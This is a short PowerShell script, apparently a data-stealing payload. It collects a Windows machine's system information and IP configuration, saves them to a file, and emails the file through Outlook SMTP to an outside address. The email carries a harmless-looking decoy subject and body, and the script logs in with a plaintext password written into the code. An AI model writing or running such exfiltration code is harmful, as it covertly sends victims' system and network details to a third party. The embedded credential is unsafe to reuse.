$value = Get-ComputerInfo
$ip = Get-NetIPConfiguration
$value, $ip | Out-File -FilePath C:\Users\$env:UserName\Downloads\test.txt

$attachment = "C:\Users\user\Downloads\test.txt"
$EmailTo = "myansen039@outlook.com"
$EmailFrom = "myansen039@outlook.com"
$Subject = "hello there!!" 
$Body = "how are you??"
$smtpServer = "smtp.outlook.com" 
$smtpMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
$attach = new-object Net.Mail.Attachment($attachment)
$smtpMessage.Attachments.Add($attach)
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
$SMTPClient.EnableSsl = $true 
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("myansen039@outlook.com", "Root@roxx1"); 
$SMTPClient.Send($smtpMessage)
Start-Sleep -Seconds 120






